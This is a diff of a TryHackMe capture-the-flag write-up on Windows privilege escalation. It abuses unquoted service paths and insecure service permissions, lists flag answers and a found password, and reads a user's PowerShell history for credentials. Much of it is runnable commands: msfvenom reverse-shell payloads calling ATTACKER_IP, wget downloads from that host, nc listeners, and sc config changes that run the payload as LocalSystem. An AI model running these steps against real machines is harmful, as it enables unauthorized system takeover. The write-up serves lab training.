@@ -54,6 +54,7 @@ Additionally, special built-in accounts exist:
 To read the Powershell history enter the following command: ```type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```
 
 ![Reading Powershell history](images/julia.jones%20password.png)
+
 There on line 6 we find her password.
 #### Answer: ZuperCkretPa5z
 
@@ -181,7 +182,7 @@ sc start windowsscheduler
 
 ![Receving shell](images/receving_shell.png)
 
-Now we are connected, we've to find the flag following command: ```dir \flag.txt /s /p```
+Now we are connected, we've to find the flag following command: `dir \flag.txt /s /p`
 
 ![Finding flag](images/find_flag_cmmnd.png)
 
@@ -189,3 +190,62 @@ We found it. Now read the flag:
 
 ![Read the flag](images/flag_text_2.png)
 #### Answer: THM{AT_YOUR_SERVICE}
+### Q.2: Get the flag on svcusr2's desktop.
+Now it is time to abuse Unquoted Service Paths. The process is quite similar. We place a binary in a place that gets called due to a Task Scheduler task not correctly specifying its BINARY_PATH:NAME (not using double quotes), causing our payload to be called instead. Again , we need to build a payload with msfvenom, download it from our attacker machine, setup a listener, and start the scheduled task.
+The problem is with the following task: `sc qc "disk sorter enterprise"`
+
+![Printing scheduled task info](images/printing_schedule_task.png)
+
+If we check the permissions on the binary file location we can see that we have writing privileges: `icacls c:\MyPrograms`
+
+![Reading our permissions](images/reasding_permission_again.png)
+
+There we can do as follows on our machine: 
+```
+# Create payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev_svc2.exe
+
+# And Setup a server
+python3 -m http.server
+```
+Then we download the file on our target machine: `wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe`
+
+Setup a listener on our attacker machine: `nc -lnvp 4445`
+
+Move the file and give it permissions:
+```
+C:\Users\thm-unpriv>move C:\Users\thm-unpriv\rev_svc2.exe C:\MyPrograms\Disk.exe
+        1 file(s) moved.
+
+C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+processed file: C:\MyPrograms\Disk.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Then restart the task: 
+```
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+```
+![Restarting the task](images/restaring_task.png)
+
+And we got a **reverse shell**. As before, find the flag by `dir \flag.txt /s /p`. We would find the location of **flag.txt**. Then read the flag and submit.
+![Final task to read the flag](images/final.png)
+#### Answer: THM{QUOTES_EVERYWHERE}
+
+### Q.3: Get the flag on the Administrator’s desktop.
+We know the drill by now. It is very similar with last two proccess.
+1. Create a payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`
+2. Start a on local machine server: `python3 -m http.server`
+3. Then Start a listener on local machine: `nc -lvp 4447`
+4. Download the file from Powershell on the target machine(teyhackme lab): `wget http://ATTACKER_IP:8000/rev_svc3.exe -o rev_svc3.exe`
+5. Change the permissions: `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
+6. In target cmd configure the binPath by following command: `sc config THMService binPath= “C:\Users\thm-unpriv\rev-svc3.exe” obj= LocalSystem`
+7. To trigger our payload, all that rests is restarting the service:
+```
+sc stop THMService
+sc start THMService
+```
+You should have received a reverse shell. Then find the flag on the administrator’s desktop and read it.
+![Receiving a shell & Reading the flag](images/administrator_flag.png)
+#### Answer: THM{INSECURE_SVC_CONFIG}
